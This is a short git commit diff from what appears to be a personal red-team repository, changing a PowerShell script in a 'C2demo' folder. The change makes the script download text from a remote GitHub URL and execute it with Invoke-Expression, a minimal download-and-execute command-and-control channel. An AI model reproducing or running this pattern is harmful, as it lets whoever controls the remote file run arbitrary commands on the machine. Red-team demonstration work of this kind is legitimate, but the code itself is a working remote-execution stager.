75fcf1275aa4440b088620ded9ba1b30ad893145
roccosicilia <rocco.sicilia@protonmail.com>
2023-01-12 10:41:29 +0100

    NOP

--- RedTeam/C2demo/invoke-demo.ps1
+++ RedTeam/C2demo/invoke-demo.ps1
@@ -1,3 +1,5 @@
 
 $cmd = Invoke-webrequest -URI "https://raw.githubusercontent.com/roccosicilia/sToolz/master/RedTeam/C2demo/input.txt"
-Write-Host $cmd
+Write-Host "Test del comando" + $cmd
+
+Invoke-Expression $cmd
